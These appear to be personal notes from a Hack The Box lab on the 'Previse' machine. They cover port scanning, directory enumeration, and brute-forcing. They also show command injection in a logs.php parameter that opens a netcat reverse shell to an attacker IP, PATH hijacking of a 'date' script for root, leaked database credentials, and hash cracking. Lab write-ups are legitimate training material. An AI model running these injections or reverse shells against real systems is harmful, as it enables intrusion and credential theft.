# scanning
* `TCP` Scan
TARGET=10.10.11.104 && nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmap

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-favicon: Unknown favicon MD5: B21DD667DF8D81CAE6DD1374DD548004
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Previse Login
|_Requested resource was login.php
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


# web enum (10.10.11.104)
> curl http://10.10.11.104/login.php | html2text
```
****** Previse File Storage ******
***** Login *****
 [username            ]
 [********************]
LOG IN
Created_by_m4lwhere
```

> dirsearch -u http://10.10.11.104 -e php,html,txt,sql -w /usr/share/wordlists/dirb/common.txt -f -r
[09:39:41] 302 -    4KB - /accounts.php  ->  login.php
[09:39:58] 200 -    0B  - /config.php
[09:40:01] 200 -  939B  - /css/     (Added to queue)
[09:40:01] 301 -  310B  - /css  ->  http://10.10.11.104/css/
[09:40:07] 302 -    0B  - /download.php  ->  login.php
[09:40:13] 200 -   15KB - /favicon.ico
[09:40:13] 302 -    8KB - /files.php  ->  login.php
[09:40:14] 200 -  217B  - /footer.php
[09:40:20] 200 -  980B  - /header.php
[09:40:22] 403 -  277B  - /icons/     (Added to queue)
[09:40:23] 302 -    3KB - /index.php  ->  login.php
[09:40:23] 302 -    3KB - /index.php/  ->  login.php
[09:40:27] 200 -    1KB - /js/     (Added to queue)
[09:40:27] 301 -  309B  - /js  ->  http://10.10.11.104/js/
[09:40:30] 200 -    2KB - /login.php
[09:40:31] 302 -    0B  - /logout.php  ->  login.php
[09:40:31] 302 -    0B  - /logs.php  ->  login.php
[09:40:37] 200 -    1KB - /nav.php
[09:40:59] 403 -  277B  - /server-status
[09:40:59] 403 -  277B  - /server-status/     (Added to queue)
[09:41:06] 302 -    3KB - /status.php  ->  login.php
[09:46:11] 200 -    5KB - /icons/README
[09:46:11] 200 -   35KB - /icons/README.html
[09:46:20] 301 -  318B  - /icons/small  ->  http://10.10.11.104/icons/small/ 

* http://previse.htb/nav.php

> hydra -l admin -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10k-most-common.txt 10.10.11.104 http-post-form "/login.php:username=^USER^&password=^PASS^:F=Invalid"
`none`

* create account by intercepting the create account req and modify response code
* need to intercept the reg request as well


```
time,user,fileID
1622482496,m4lwhere,4
1622485614,m4lwhere,4
1622486215,m4lwhere,4
1622486218,m4lwhere,1
1622486221,m4lwhere,1
1622678056,m4lwhere,5
1622678059,m4lwhere,6
1622679247,m4lwhere,1
1622680894,m4lwhere,5
1622708567,m4lwhere,4
1622708573,m4lwhere,4
1622708579,m4lwhere,5
1622710159,m4lwhere,4
1622712633,m4lwhere,4
1622715674,m4lwhere,24
1622715842,m4lwhere,23
1623197471,m4lwhere,25
1623200269,m4lwhere,25
1623236411,m4lwhere,23
1623236571,m4lwhere,26
1623238675,m4lwhere,23
1623238684,m4lwhere,23
1623978778,m4lwhere,32
1638794952,aisha,32
1638814623,admin,34
1638814640,admin,34
1638814790,admin,35
1638814956,admin,33
1638814966,admin,32
1638815544,admin,32
1638815969,admin,32
1638816534,admin,34
1638816563,test137,33
1638819009,admin,37
1638819016,admin,32
1638819026,admin,33
1638819029,admin,34
1638819228,administrator,32
1638820740,administrator,32
1638825114,m4lwhere,32
1638825118,m4lwhere,37
1638825127,m4lwhere,34
1638825206,m4lwhere,32
1638829058,m4lwhere,32
1638829060,m4lwhere,33
1638829061,m4lwhere,34
1638829062,m4lwhere,37
```
* download siteBackup, config.php
```
$host = 'localhost';
$user = 'root';
$passwd = 'mySQL_p@ssw0rd!:)';
$db = 'previse';
```

* reverse shell
```
POST /logs.php HTTP/1.1

Host: previse.htb

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded

Content-Length: 62

Origin: http://previse.htb

DNT: 1

Connection: close

Referer: http://previse.htb/file_logs.php

Cookie: PHPSESSID=3e8ci3mbatpel3qnnjl4sgo76n

Upgrade-Insecure-Requests: 1



delim=comma|nc${IFS}-e${IFS}/bin/sh${IFS}10.10.x.x${IFS}4444
```

# pe
* found /home/m4lwhere/date
```
echo 'nc -e /bin/sh 10.10.x.x 5555' > date
```

* login to mysql
```
mysql> show tables;
show tables;
+-------------------+
| Tables_in_previse |
+-------------------+
| accounts          |
| files             |
+-------------------+
2 rows in set (0.00 sec)

mysql> select * from accounts;
select * from accounts;
+----+----------+------------------------------------+---------------------+
| id | username | password                           | created_at          |
+----+----------+------------------------------------+---------------------+
|  1 | m4lwhere | $1$ðŸ§‚llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 |
|  2 | test1    | $1$ðŸ§‚llol$rCfLNVEV/lMn6ru.fXs/a1 | 2021-12-06 23:09:33 |
+----+----------+------------------------------------+---------------------+
2 rows in set (0.00 sec)
```

* crack password
> hashcat64.exe -a 0 -m 500 hash.txt rockyou.txt
$1$â‰¡Æ’ÂºÃ©llol$DQpmdvnb7EeuO6UaqRItf.:`ilovecody112235!`

> ssh m4lwhere@10.10.11.104

> m4lwhere@previse:~$ sudo -l
[sudo] password for m4lwhere: 
User m4lwhere may run the following commands on previse:
    (root) /opt/scripts/access_backup.sh

> id
uid=0(root) gid=0(root) groups=0(root)
ls
date
user.txt
cat user.txt

cat /root/root.txt

https://app.hackthebox.com/machines/Previse
